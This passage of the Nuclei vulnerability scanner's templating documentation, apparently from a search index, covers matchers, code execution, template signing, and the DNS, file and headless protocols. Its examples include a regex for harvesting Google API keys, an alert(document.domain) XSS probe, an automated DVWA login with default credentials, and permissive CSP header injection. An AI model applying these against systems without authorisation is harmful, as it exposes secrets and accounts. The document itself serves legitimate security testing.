scanning.","title":"Matchers"},{"location":"templating-guide/operators/matchers/#types","text":"Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body Matchers also support hex encoded data which will be decoded and matched. matchers : - type : word encoding : hex words : - \"50494e47\" part : body Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows building more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results. matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a Protocol response can be matched with DSL matcher. Some examples - Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw)","title":"Types"},{"location":"templating-guide/operators/matchers/#conditions","text":"Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher.","title":"Conditions"},{"location":"templating-guide/operators/matchers/#matched-parts","text":"Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Example matchers for HTTP response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility.","title":"Matched Parts"},{"location":"templating-guide/operators/matchers/#negative-matchers","text":"All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true","title":"Negative Matchers"},{"location":"templating-guide/operators/matchers/#multiple-matchers","text":"Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header","title":"Multiple Matchers"},{"location":"templating-guide/operators/matchers/#matchers-condition","text":"While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers Condition"},{"location":"templating-guide/protocols/code/","text":"Code Requests (beta) \u00b6 Nuclei enables the execution of external code on the host operating system. This feature allows security researchers, pentesters, and developers to extend the capabilities of Nuclei and perform complex actions beyond the scope of regular supported protocol-based testing. By leveraging this capability, Nuclei can interact with the underlying operating system and execute custom scripts or commands, opening up a wide range of possibilities. It enables users to perform tasks such as system-level configurations, file operations, network interactions, and more. This level of control and flexibility empowers users to tailor their security testing workflows according to their specific requirements. However, it's important to exercise caution while utilizing this feature, as executing external code on the host operating system carries inherent risks. It is crucial to ensure that the executed code is secure, thoroughly tested, and does not pose any unintended consequences or security risks to the target system. Template Signing (beta) \u00b6 Template signing via the private-public key mechanism is a crucial aspect of ensuring the integrity and authenticity of templates. This mechanism involves the use of asymmetric cryptography, specifically RSA and ECDSA algorithms, to create a secure and verifiable signature. In this process, a template author generates a private key that remains confidential and securely stored. The corresponding public key is then shared with the template consumers. When a template is created or modified, the author signs it using their private key, generating a unique signature that is attached to the template. Template consumers can verify the authenticity and integrity of a signed template by using the author's public key. By applying the appropriate cryptographic algorithm (RSA or ECDSA), they can validate the signature and ensure that the template has not been tampered with since it was signed. This provides a level of trust, as any modifications or unauthorized changes to the template would result in a failed verification process. By employing the private-public key mechanism, template signing adds an additional layer of security and trust to the template ecosystem. It helps establish the identity of the template author and ensures that the templates used in various systems are genuine and have not been altered maliciously. How to sign a template \u00b6 First it's necessary to generate a private/public key pair. You need openssl . Here follows the commands for the two supported signature algorithms: # ECDSA $ openssl ecparam -name prime256v1 -genkey -noout -out private.key $ openssl ec -in priv-key.pem -pubout > public.key # RSA $ ssh-keygen -t rsa Then these keys need to be exported as environment variables: # OSX + Linux export NUCLEI_SIGNATURE_PRIVATE_KEY=path/to/private.key export NUCLEI_SIGNATURE_PUBLIC_KEY=path/to/public.key export NUCLEI_SIGNATURE_ALGORITHM=rsa # Windows $ env:NUCLEI_SIGNATURE_PRIVATE_KEY = 'path/to/private.key' $ env:NUCLEI_SIGNATURE_PUBLIC_KEY = 'path/to/public.key' $ env:NUCLEI_SIGNATURE_ALGORITHM = 'rsa' Finally a template can be signed either with the v2/cmd/sign-templates utility or directly with nuclei with the following commands: # with sign-templates go run -v github.com/projectdiscovery/nuclei/v2/cmd/sign-templates -t code_template.yaml -prk path/to/private.key -puk path/to/public.key -a rsa # with nuclei nuclei -t code_template.yaml -sign This will add a comment at the bottom of the template containing the hash signature: # digest: 4a0a00473045022023beecb1c4ef5b3b3a4d936a689d0fa5fea35524d23bbc12001fa0b21ca2500b02210082484d006ee0663ba1c8450ff0d10eb053308137af25cde223406c3423c4e5d1 Code \u00b6 In the context of template creation, a code block is used to indicate the start of the requests for the template. This block marks the beginning of the code-related instructions. # Start the requests for the template right here code : To execute the code, a list of engines is specified, which are searched sequentially until a valid one is found on the system. The engine names must match the corresponding binary names on the system. - engine : - py - python3 The code to be executed can be provided either as an external file or as a code snippet directly within the template. For an external file: source : protocols/code/pyfile.py For a code snippet: source : | import sys print(\"hello from \" + sys.stdin.read()) The target is passed to the template via stdin, and the output of the executed code is available for further processing in matchers and extractors. In the case of the Code protocol, the body part represents all data printed to stdout during the execution of the code. Matchers / Extractor Parts \u00b6 Valid part values supported by Code protocol for Matchers / Extractor are - Value Description body All data printed from stdout Example Code Template \u00b6 The provided example demonstrates the execution of a Python script within the template. The specified engines are searched in the given order, and the code snippet is executed accordingly. Additionally, a matcher is included to check if the code's stdout contains the phrase \"hello from input.\" (input must be passed as target with nuclei) id : py-code-snippet info : name : py-code-snippet author : pdteam severity : info tags : code description : | py-code-snippet code : - engine : - py - python3 source : | import sys print(\"hello from \" + sys.stdin.read()) matchers : - type : word words : - \"hello from input\" # digest: 4a0a00473045022023beecb1c4ef5b3b3a4d936a689d0fa5fea35524d23bbc12001fa0b21ca2500b02210082484d006ee0663ba1c8450ff0d10eb053308137af25cde223406c3423c4e5d1","title":"Code"},{"location":"templating-guide/protocols/code/#code-requests-beta","text":"Nuclei enables the execution of external code on the host operating system. This feature allows security researchers, pentesters, and developers to extend the capabilities of Nuclei and perform complex actions beyond the scope of regular supported protocol-based testing. By leveraging this capability, Nuclei can interact with the underlying operating system and execute custom scripts or commands, opening up a wide range of possibilities. It enables users to perform tasks such as system-level configurations, file operations, network interactions, and more. This level of control and flexibility empowers users to tailor their security testing workflows according to their specific requirements. However, it's important to exercise caution while utilizing this feature, as executing external code on the host operating system carries inherent risks. It is crucial to ensure that the executed code is secure, thoroughly tested, and does not pose any unintended consequences or security risks to the target system.","title":"Code Requests (beta)"},{"location":"templating-guide/protocols/code/#template-signing-beta","text":"Template signing via the private-public key mechanism is a crucial aspect of ensuring the integrity and authenticity of templates. This mechanism involves the use of asymmetric cryptography, specifically RSA and ECDSA algorithms, to create a secure and verifiable signature. In this process, a template author generates a private key that remains confidential and securely stored. The corresponding public key is then shared with the template consumers. When a template is created or modified, the author signs it using their private key, generating a unique signature that is attached to the template. Template consumers can verify the authenticity and integrity of a signed template by using the author's public key. By applying the appropriate cryptographic algorithm (RSA or ECDSA), they can validate the signature and ensure that the template has not been tampered with since it was signed. This provides a level of trust, as any modifications or unauthorized changes to the template would result in a failed verification process. By employing the private-public key mechanism, template signing adds an additional layer of security and trust to the template ecosystem. It helps establish the identity of the template author and ensures that the templates used in various systems are genuine and have not been altered maliciously.","title":"Template Signing (beta)"},{"location":"templating-guide/protocols/code/#how-to-sign-a-template","text":"First it's necessary to generate a private/public key pair. You need openssl . Here follows the commands for the two supported signature algorithms: # ECDSA $ openssl ecparam -name prime256v1 -genkey -noout -out private.key $ openssl ec -in priv-key.pem -pubout > public.key # RSA $ ssh-keygen -t rsa Then these keys need to be exported as environment variables: # OSX + Linux export NUCLEI_SIGNATURE_PRIVATE_KEY=path/to/private.key export NUCLEI_SIGNATURE_PUBLIC_KEY=path/to/public.key export NUCLEI_SIGNATURE_ALGORITHM=rsa # Windows $ env:NUCLEI_SIGNATURE_PRIVATE_KEY = 'path/to/private.key' $ env:NUCLEI_SIGNATURE_PUBLIC_KEY = 'path/to/public.key' $ env:NUCLEI_SIGNATURE_ALGORITHM = 'rsa' Finally a template can be signed either with the v2/cmd/sign-templates utility or directly with nuclei with the following commands: # with sign-templates go run -v github.com/projectdiscovery/nuclei/v2/cmd/sign-templates -t code_template.yaml -prk path/to/private.key -puk path/to/public.key -a rsa # with nuclei nuclei -t code_template.yaml -sign This will add a comment at the bottom of the template containing the hash signature: # digest: 4a0a00473045022023beecb1c4ef5b3b3a4d936a689d0fa5fea35524d23bbc12001fa0b21ca2500b02210082484d006ee0663ba1c8450ff0d10eb053308137af25cde223406c3423c4e5d1","title":"How to sign a template"},{"location":"templating-guide/protocols/code/#code","text":"In the context of template creation, a code block is used to indicate the start of the requests for the template. This block marks the beginning of the code-related instructions. # Start the requests for the template right here code : To execute the code, a list of engines is specified, which are searched sequentially until a valid one is found on the system. The engine names must match the corresponding binary names on the system. - engine : - py - python3 The code to be executed can be provided either as an external file or as a code snippet directly within the template. For an external file: source : protocols/code/pyfile.py For a code snippet: source : | import sys print(\"hello from \" + sys.stdin.read()) The target is passed to the template via stdin, and the output of the executed code is available for further processing in matchers and extractors. In the case of the Code protocol, the body part represents all data printed to stdout during the execution of the code.","title":"Code"},{"location":"templating-guide/protocols/code/#matchers-extractor-parts","text":"Valid part values supported by Code protocol for Matchers / Extractor are - Value Description body All data printed from stdout","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/code/#example-code-template","text":"The provided example demonstrates the execution of a Python script within the template. The specified engines are searched in the given order, and the code snippet is executed accordingly. Additionally, a matcher is included to check if the code's stdout contains the phrase \"hello from input.\" (input must be passed as target with nuclei) id : py-code-snippet info : name : py-code-snippet author : pdteam severity : info tags : code description : | py-code-snippet code : - engine : - py - python3 source : | import sys print(\"hello from \" + sys.stdin.read()) matchers : - type : word words : - \"hello from input\" # digest: 4a0a00473045022023beecb1c4ef5b3b3a4d936a689d0fa5fea35524d23bbc12001fa0b21ca2500b02210082484d006ee0663ba1c8450ff0d10eb053308137af25cde223406c3423c4e5d1","title":"Example Code Template"},{"location":"templating-guide/protocols/dns/","text":"DNS Requests \u00b6 DNS protocol can be modelled in nuclei with ease. Fully Customizable DNS requests can be sent by nuclei to nameservers and matching/extracting can be performed on their response. DNS Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : Type \u00b6 First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A Name \u00b6 The next part of the requests is the DNS name to resolve. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. An example name value: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one name per request. Class \u00b6 Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet Recursion \u00b6 Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true Retries \u00b6 Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3 Matchers / Extractor Parts \u00b6 Valid part values supported by DNS protocol for Matchers / Extractor are - Value Description request DNS Request rcode DNS Rcode question DNS Question Message extra DNS Message Extra Field answer DNS Message Answer Field ns DNS Message Authority Field raw / all / body Raw DNS Message Example DNS Template \u00b6 The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contain a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and More complete examples are provided here","title":"DNS"},{"location":"templating-guide/protocols/dns/#dns-requests","text":"DNS protocol can be modelled in nuclei with ease. Fully Customizable DNS requests can be sent by nuclei to nameservers and matching/extracting can be performed on their response. DNS Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns :","title":"DNS Requests"},{"location":"templating-guide/protocols/dns/#type","text":"First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A","title":"Type"},{"location":"templating-guide/protocols/dns/#name","text":"The next part of the requests is the DNS name to resolve. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. An example name value: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one name per request.","title":"Name"},{"location":"templating-guide/protocols/dns/#class","text":"Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet","title":"Class"},{"location":"templating-guide/protocols/dns/#recursion","text":"Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true","title":"Recursion"},{"location":"templating-guide/protocols/dns/#retries","text":"Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3","title":"Retries"},{"location":"templating-guide/protocols/dns/#matchers-extractor-parts","text":"Valid part values supported by DNS protocol for Matchers / Extractor are - Value Description request DNS Request rcode DNS Rcode question DNS Question Message extra DNS Message Extra Field answer DNS Message Answer Field ns DNS Message Authority Field raw / all / body Raw DNS Message","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/dns/#example-dns-template","text":"The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contain a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and More complete examples are provided here","title":"Example DNS Template"},{"location":"templating-guide/protocols/file/","text":"File Requests \u00b6 Nuclei allows modelling templates that can match/extract on filesystem too. # Start of file template block file : Extensions \u00b6 To match on all extensions (except the ones in default denylist), use the following - extensions : - all You can also provide a list of custom extensions that should be matched upon. extensions : - py - go A denylist of extensions can also be provided. Files with these extensions will not be processed by nuclei. extensions : - all denylist : - go - py - txt By default, certain extensions are excluded in nuclei file module. A list of these is provided below- 3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip More Options \u00b6 max-size parameter can be provided which limits the maximum size (in bytes) of files read by nuclei engine. As default the max-size value is 5 MB (5242880), Files larger than the max-size will not be processed. no-recursive option disables recursive walking of directories / globs while input is being processed for file module of nuclei. Matchers / Extractor \u00b6 File protocol supports 2 types of Matchers - Matcher Type Part Matched word all regex all Extractors Type Part Matched word all regex all Example File Template \u00b6 The final example template file for a Private Key detection is provided below. id : google-api-key info : name : Google API Key author : pdteam severity : info file : - extensions : - all - txt extractors : - type : regex name : google-api-key regex : - \"AIza[0-9A-Za-z\\\\-_]{35}\" # Running file template on http-response/ directory nuclei -t file.yaml -target http-response/ # Running file template on output.txt nuclei -t file.yaml -target output.txt More complete examples are provided here","title":"File"},{"location":"templating-guide/protocols/file/#file-requests","text":"Nuclei allows modelling templates that can match/extract on filesystem too. # Start of file template block file :","title":"File Requests"},{"location":"templating-guide/protocols/file/#extensions","text":"To match on all extensions (except the ones in default denylist), use the following - extensions : - all You can also provide a list of custom extensions that should be matched upon. extensions : - py - go A denylist of extensions can also be provided. Files with these extensions will not be processed by nuclei. extensions : - all denylist : - go - py - txt By default, certain extensions are excluded in nuclei file module. A list of these is provided below- 3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip","title":"Extensions"},{"location":"templating-guide/protocols/file/#more-options","text":"max-size parameter can be provided which limits the maximum size (in bytes) of files read by nuclei engine. As default the max-size value is 5 MB (5242880), Files larger than the max-size will not be processed. no-recursive option disables recursive walking of directories / globs while input is being processed for file module of nuclei.","title":"More Options"},{"location":"templating-guide/protocols/file/#matchers-extractor","text":"File protocol supports 2 types of Matchers - Matcher Type Part Matched word all regex all Extractors Type Part Matched word all regex all","title":"Matchers / Extractor"},{"location":"templating-guide/protocols/file/#example-file-template","text":"The final example template file for a Private Key detection is provided below. id : google-api-key info : name : Google API Key author : pdteam severity : info file : - extensions : - all - txt extractors : - type : regex name : google-api-key regex : - \"AIza[0-9A-Za-z\\\\-_]{35}\" # Running file template on http-response/ directory nuclei -t file.yaml -target http-response/ # Running file template on output.txt nuclei -t file.yaml -target output.txt More complete examples are provided here","title":"Example File Template"},{"location":"templating-guide/protocols/headless/","text":"Headless Requests \u00b6 Nuclei supports automation of a browser with simple DSL. Headless browser engine can be fully customized and user actions can be scripted allowing complete control over the browser. This allows for a variety of unique and custom workflows. # Start the requests for the template right here headless : Actions \u00b6 Action is a single piece of Task for the Nuclei Headless Engine. Each action manipulates the browser state in some way, and finally leads to the state that we are interested in capturing. Nuclei supports a variety of actions. A list of these Actions along with their arguments is given below - navigate \u00b6 Navigate visits a given URL. url field supports variables like {{BaseURL}} , {{Hostname}} to customize the request fully. action : navigate args : url : \"{{BaseURL}} script \u00b6 Script runs JS code on the current browser page. At the simplest level, you can just provide a code argument with the JS snippet you want to execute, and it will be run on the page. action : script args : code : alert(document.domain) Suppose you want to run a matcher on a JS object to inspect its value. This type of data extraction use case is also supported with nuclei headless. As an example, let's say the application sets an object called window.random-object with a value, and you want to match on that value. - action : script args : code : window.random-object name : script-name ... matchers : - type : word part : script-name words : - \"some-value\" Nuclei supports running some custom Javascript, before the page load with the hook argument. This will always run the provided Javascript, before any of the pages load. The example provided hooks window.alert so that the alerts that are generated by the application do not stop the crawler. - action : script args : code : (function() { window.alert=function(){} })() hook : true This is one use case, there are many more use cases of function hooking such as DOM XSS Detection and Javascript-Injection based testing techniques. Further examples are provided on the examples page. click \u00b6 Click simulates clicking with the Left-Mouse button on an element specified by a selector. action : click args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input Nuclei supports a variety of selector types, including but not limited to XPath, Regex, CSS, etc. For more information about selectors, see here . rightclick \u00b6 RightClick simulates clicking with the Right-Mouse button on an element specified by a selector. action : rightclick args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input text \u00b6 Text simulates typing something into an input with Keyboard. Selectors can be used to specify the element to type in. action : text args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : username screenshot \u00b6 Screenshot takes the screenshot of a page and writes it to disk. It supports both full page and normal screenshots. action : screenshot args : to : /root/test/screenshot-web If you require a full page screenshot, it can be achieved with fullpage: true option in the args. action : screenshot args : to : /root/test/screenshot-web fullpage : true time \u00b6 Time enters values into time inputs on pages in RFC3339 format. action : time args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : 2006-01-02T15:04:05Z07:00 select \u00b6 Select performs selection on an HTML Input by a selector. action : select args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected : true value : option[value=two] selector : regex files \u00b6 Files handles a file upload input on the webpage. action : files args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : /root/test/payload.txt waitload \u00b6 WaitLoad waits for a page to finish loading and get in Idle state. action : waitload Nuclei's waitload action waits for DOM to load, and window.onload event to be received after which we wait for the page to become idle for 1 seconds. getresource \u00b6 GetResource returns the src attribute for an element. action : getresource name : extracted-value-src args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input extract \u00b6 Extract extracts either the Text for an HTML Node, or an attribute as specified by the user. The below code will extract the Text for the given XPath Selector Element, which can then also be matched upon by name extracted-value with matchers and extractors. action : extract name : extracted-value args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input An attribute can also be extracted for an element. For example - action : extract name : extracted-value-href args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target : attribute attribute : href setmethod \u00b6 SetMethod overrides the method for the request. action : setmethod args : part : request method : DELETE addheader \u00b6 AddHeader adds a header to the requests / responses. This does not overwrite any pre-existing headers. action : addheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" setheader \u00b6 SetHeader sets a header in the requests / responses. action : setheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" deleteheader \u00b6 DeleteHeader deletes a header from requests / responses. action : deleteheader args : part : response # can be request too key : Content-Security-Policy setbody \u00b6 SetBody sets the body for a request / response. action : setbody args : part : response # can be request too body : '{\"success\":\"ok\"}' waitevent \u00b6 WaitEvent waits for an event to trigger on the page. action : waitevent args : event : 'Page.loadEventFired' The list of events supported are listed here . keyboard \u00b6 Keyboard simulates a single key-press on the keyboard. action : keyboard args : keys : '\\r' # this simulates pressing enter key on keyboard keys argument accepts key-codes. debug \u00b6 Debug adds a delay of 5 seconds between each headless action and also shows a trace of all the headless events occurring in the browser. Note: Only use this for debugging purposes, don't use this in production templates. action : debug sleep \u00b6 Sleep makes the browser wait for a specified duration in seconds. This is also useful for debugging purposes. action : sleep args : duration : 5 Selectors \u00b6 Selectors are how nuclei headless engine identifies what element to execute an action on. Nuclei supports getting selectors by including a variety of options - Selector Description r / regex Element matches CSS Selector and Text Matches Regex x / xpath Element matches XPath selector js Return elements from a JS function search Search for a query (can be text, XPATH, CSS) selector (default) Element matches CSS Selector Matchers / Extractor Parts \u00b6 Valid part values supported by Headless protocol for Matchers / Extractor are - Value Description request Headless Request <out_names> Action names with stored values raw / body / data Final DOM response from browser Example Headless Template \u00b6 An example headless template to automatically login into DVWA is provided below - id : dvwa-headless-automatic-login info : name : DVWA Headless Automatic Login author : pdteam severity : high headless : - steps : - args : url : \"{{BaseURL}}/login.php\" action : navigate - action : waitload - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input action : click - action : waitload - args : by : xpath value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input[2] action : click - action : waitload - args : by : xpath value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload matchers : - part : resp type : word words : - \"You have logged in as\" More complete examples are provided here","title":"Headless"},{"location":"templating-guide/protocols/headless/#headless-requests","text":"Nuclei supports automation of a browser with simple DSL. Headless browser engine can be fully customized and user actions can be scripted allowing complete control over the browser. This allows for a variety of unique and custom workflows. # Start the requests for the template right here headless :","title":"Headless Requests"},{"location":"templating-guide/protocols/headless/#actions","text":"Action is a single piece of Task for the Nuclei Headless Engine. Each action manipulates the browser state in some way, and finally leads to the state that we are interested in capturing. Nuclei supports a variety of actions. A list of these Actions along with their arguments is given below -","title":"Actions"},{"location":"templating-guide/protocols/headless/#navigate","text":"Navigate visits a given URL. url field supports variables like {{BaseURL}} , {{Hostname}} to customize the request fully. action : navigate args : url : \"{{BaseURL}}","title":"navigate"},{"location":"templating-guide/protocols/headless/#script","text":"Script runs JS code on the current browser page. At the simplest level, you can just provide a code argument with the JS snippet you want to execute, and it will be run on the page. action : script args : code : alert(document.domain) Suppose you want to run a matcher on a JS object to inspect its value. This type of data extraction use case is also supported with nuclei headless. As an example, let's say the application sets an object called window.random-object with a value, and you want to match on that value. - action : script args : code : window.random-object name : script-name ... matchers : - type : word part : script-name words : - \"some-value\" Nuclei supports running some custom Javascript, before the page load with the hook argument. This will always run the provided Javascript, before any of the pages load. The example provided hooks window.alert so that the alerts that are generated by the application do not stop the crawler. - action : script args : code : (function() { window.alert=function(){} })() hook : true This is one use case, there are many more use cases of function hooking such as DOM XSS Detection and Javascript-Injection based testing techniques. Further examples are provided on the examples page.","title":"script"},{"location":"templating-guide/protocols/headless/#click","text":"Click simulates clicking with the Left-Mouse button on an element specified by a selector. action : click args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input Nuclei supports a variety of selector types, including but not limited to XPath, Regex, CSS, etc. For more information about selectors, see here .","title":"click"},{"location":"templating-guide/protocols/headless/#rightclick","text":"RightClick simulates clicking with the Right-Mouse button on an element specified by a selector. action : rightclick args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input","title":"rightclick"},{"location":"templating-guide/protocols/headless/#text","text":"Text simulates typing something into an input with Keyboard. Selectors can be used to specify the element to type in. action : text args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : username","title":"text"},{"location":"templating-guide/protocols/headless/#screenshot","text":"Screenshot takes the screenshot of a page and writes it to disk. It supports both full page and normal screenshots. action : screenshot args : to : /root/test/screenshot-web If you require a full page screenshot, it can be achieved with fullpage: true option in the args. action : screenshot args : to : /root/test/screenshot-web fullpage : true","title":"screenshot"},{"location":"templating-guide/protocols/headless/#time","text":"Time enters values into time inputs on pages in RFC3339 format. action : time args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : 2006-01-02T15:04:05Z07:00","title":"time"},{"location":"templating-guide/protocols/headless/#select","text":"Select performs selection on an HTML Input by a selector. action : select args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected : true value : option[value=two] selector : regex","title":"select"},{"location":"templating-guide/protocols/headless/#files","text":"Files handles a file upload input on the webpage. action : files args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : /root/test/payload.txt","title":"files"},{"location":"templating-guide/protocols/headless/#waitload","text":"WaitLoad waits for a page to finish loading and get in Idle state. action : waitload Nuclei's waitload action waits for DOM to load, and window.onload event to be received after which we wait for the page to become idle for 1 seconds.","title":"waitload"},{"location":"templating-guide/protocols/headless/#getresource","text":"GetResource returns the src attribute for an element. action : getresource name : extracted-value-src args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input","title":"getresource"},{"location":"templating-guide/protocols/headless/#extract","text":"Extract extracts either the Text for an HTML Node, or an attribute as specified by the user. The below code will extract the Text for the given XPath Selector Element, which can then also be matched upon by name extracted-value with matchers and extractors. action : extract name : extracted-value args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input An attribute can also be extracted for an element. For example - action : extract name : extracted-value-href args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target : attribute attribute : href","title":"extract"},{"location":"templating-guide/protocols/headless/#setmethod","text":"SetMethod overrides the method for the request. action : setmethod args : part : request method : DELETE","title":"setmethod"},{"location":"templating-guide/protocols/headless/#addheader","text":"AddHeader adds a header to the requests / responses. This does not overwrite any pre-existing headers. action : addheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"","title":"addheader"},{"location":"templating-guide/protocols/headless/#setheader","text":"SetHeader sets a header in the requests / responses. action : setheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"","title":"setheader"},{"location":"templating-guide/protocols/headless/#deleteheader","text":"DeleteHeader deletes a header from requests / responses. action : deleteheader args : part : response # can be request too key 